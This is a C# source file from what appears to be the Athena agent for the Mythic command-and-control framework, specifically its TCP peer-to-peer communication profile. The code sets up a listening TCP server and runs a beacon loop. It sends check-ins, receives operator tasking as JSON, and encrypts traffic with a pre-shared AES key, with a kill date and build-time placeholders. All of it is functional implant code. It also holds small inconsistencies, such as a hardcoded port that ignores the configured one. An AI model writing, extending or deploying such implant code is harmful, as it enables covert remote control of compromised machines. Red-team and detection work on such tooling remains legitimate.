using Athena.Utilities;
using Athena.Models.Config;
using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;

using ServiceWire.TcpIp;

using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net;
using System.Text.Json;
using Athena.Profiles.SmbSW.Models;

namespace Athena
{
    public class TcpSW : IProfile
    {
        public ConcurrentBag<string> messages = new ConcurrentBag<string>();
        public string uuid { get; set; }
        public string psk { get; set; }
        public int listenport = int.Parse("%PORT%");
        public int sleep { get; set; }
        public int jitter { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("false");
        public DateTime killDate { get; set; }
        private TcpMessageHandler smbHandler { get; set; }
        private TcpHost tcpHost { get; set; }
        public PSKCrypto crypt { get; set; }
        private CancellationTokenSource cts = new CancellationTokenSource();
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);

        public TcpSW()
        {
            uuid = "%UUID%";
            this.psk = "AESPSK";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            this.sleep = 0;
            this.jitter = 0;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(this.uuid, this.psk);
                this.encrypted = true;
                this.smbHandler = new TcpMessageHandler(this.messages, this.encrypted, this.crypt);
            }
            else
            {
                this.smbHandler = new TcpMessageHandler(this.messages);
            }

            this.smbHandler.MessageReceived += OnMessageReceive;

            IPEndPoint ep = new IPEndPoint(IPAddress.Any, 8080);
            this.tcpHost = new TcpHost(ep);
            this.tcpHost.AddService(this.smbHandler);
        }

        private async void OnMessageReceive(object? sender, MessageReceivedArgs e)
        {
            //We have a full message from the Pipe.
            if (this.encrypted)
            {
                e.message = this.crypt.Decrypt(e.message);
            }
            else
            {
                e.message = (await Misc.Base64Decode(e.message)).Substring(36);
            }

            //Check what kind of message we got.
            Dictionary<string, string> msg = Misc.ConvertJsonStringToDict(e.message);

            if (msg.ContainsKey("action") && msg["action"] == "checkin") //CheckIn Response
            {
                this.messages.Add(e.message); //Add to our queue
                this.onCheckinResponse.Set();

            }
            else //We got a task response

            {
                GetTaskingResponse gtr = JsonSerializer.Deserialize(e.message, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr == null)
                {
                    return;
                }

                TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                this.SetTaskingReceived(this, tra);
            }
        }
        public async Task StartBeacon()
        {
            Debug.WriteLine($"[{DateTime.Now}] Started TCP Server on port {this.listenport}");
            this.tcpHost.Open();
            await Task.Delay(Timeout.Infinite, cts.Token);
        }
        public bool StopBeacon()
        {
            cts.Cancel();
            return true;
        }
        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            string message = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
            //Write our checkin message to the pipe
            this.messages.Add(message);

            //Wait for our ManualResetEvent to trigger indicating we got a response.
            onCheckinResponse.WaitOne();
            //We got a message, but we should make sure it's not empty.
            
            if(this.messages.TryTake(out message))
            {
                return JsonSerializer.Deserialize(message, CheckinResponseJsonContext.Default.CheckinResponse);
            }

            return new CheckinResponse()
            {
                status = "failed"
            };
        }
    }
}
